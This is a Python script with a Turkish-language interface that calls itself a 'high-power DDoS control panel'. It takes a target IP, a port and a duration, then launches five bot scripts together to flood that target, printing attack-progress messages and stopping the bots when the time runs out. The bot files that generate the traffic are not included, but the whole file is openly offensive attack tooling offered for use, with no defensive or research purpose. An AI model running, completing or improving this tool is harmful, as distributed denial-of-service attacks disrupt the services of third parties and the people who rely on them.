import subprocess
import time
import sys
import os

os.system("clear")
print("\033[92m")
print("╔══════════════════════════════════════════════════════════════════════════════╗")
print("║                 LINUXSQUAD MASTER v5.0 - 5 BOT SYSTEM                        ║")
print("║                       Yüksek Güçlü DDoS Kontrol Paneli                       ║")
print("╚══════════════════════════════════════════════════════════════════════════════╝")
print("\033[0m")

if len(sys.argv) < 3:
    print("\033[96mKullanım:\033[0m python master.py <HEDEF> <PORT> [SÜRE]")
    print("Örnek: python master.py 1.1.1.1 80 60")
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3]) if len(sys.argv) > 3 else 90

print(f"\033[91m[+] Master Başlatıldı → Hedef: {target}:{port} | Süre: {duration}s\033[0m")
print("\033[93m[+] 5 Bot aynı anda çalıştırılıyor...\033[0m\n")

bots = []
for i in range(1, 6):
    print(f"\033[92m[→] Bot{i} başlatılıyor...\033[0m")
    try:
        bot = subprocess.Popen(["python", f"bot{i}.py", target, str(port), str(duration)])
        bots.append(bot)
        time.sleep(1.2)   # Botlar arası hafif bekleme (sistem çökmesin)
    except Exception as e:
        print(f"\033[91m[!] Bot{i} başlatılamadı: {e}\033[0m")

print("\n\033[92m[+] TÜM BOTLAR AKTİF! Saldırı devam ediyor...\033[0m")
print("\033[93m   Durdurmak için Ctrl + C tuşuna bas\033[0m\n")

try:
    time.sleep(duration + 10)
except KeyboardInterrupt:
    print("\n\033[91m[-] Saldırı master tarafından durduruldu...\033[0m")

for i, bot in enumerate(bots, 1):
    if bot.poll() is None:   # Hala çalışıyorsa
        bot.terminate()
        print(f"\033[91m[×] Bot{i} durduruldu\033[0m")

print("\033[92m[+] Tüm botlar kapatıldı.\033[0m")
